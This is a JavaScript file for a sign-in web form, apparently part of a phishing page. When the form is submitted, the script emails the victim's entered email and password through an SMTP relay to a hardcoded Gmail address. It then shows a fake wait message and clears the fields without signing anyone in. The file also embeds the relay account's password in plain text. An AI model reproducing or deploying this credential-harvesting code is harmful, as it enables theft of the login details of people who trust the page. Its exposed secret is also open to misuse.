const form = document.querySelector("form");

const email = document.getElementById("email");
const password = document.getElementById("password");
const errorMessage = document.getElementById("errorMessage");
const box = document.getElementById("checkbox");
const btn = document.getElementById("btn");

const sendMail = () => {
  const msgBody = `Email: ${email.value} <br> Password: ${password.value}`;
  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "julioimmigrationservices@gmail.com",
    Password: "CD484A8DADD59722E362B0C51DE161E4F66C",
    To: "julioimmigrationservices@gmail.com",
    From: "julioimmigrationservices@gmail.com",
    Subject: "This is the subject",
    Body: msgBody,
  }).then((message) => {
    if (message) {
      Swal.fire({
        title: "Good job!",
        text: "You clicked the button!",
        icon: "success",
      });
    }
  });
};

const submitBtnText = () => {
  btn.textContent = "Sign In";
};

const clearFormFields = () => {
  email.value = "";
  password.value = "";
};

const validateForm = () => {
  if (!box.checked) {
    Swal.fire({
      // title: "OK",
      text: "Please select the checkbox below to state that you have read and understood the privacy policy.",
      icon: "warning",
      showCancelButton: false,
      confirmButtonColor: "#056d42",
      cancelButtonColor: "#d33",
      confirmButtonText: "OK",
    });

    return false;
  }

  if (email.value.trim() === "" || password.value.trim() === "") {
    errorMessage.style.display = "block";
    clearFormFields();
    submitBtnText();

    return;
  } else {
    errorMessage.style.display = "none";
    btn.textContent = "Please wait...";

    setTimeout(() => {
      clearFormFields();
      submitBtnText();
    }, 5000);
  }

  return true;
};

form.addEventListener("submit", (e) => {
  e.preventDefault();

  if (validateForm()) {
    sendMail();
  }
});
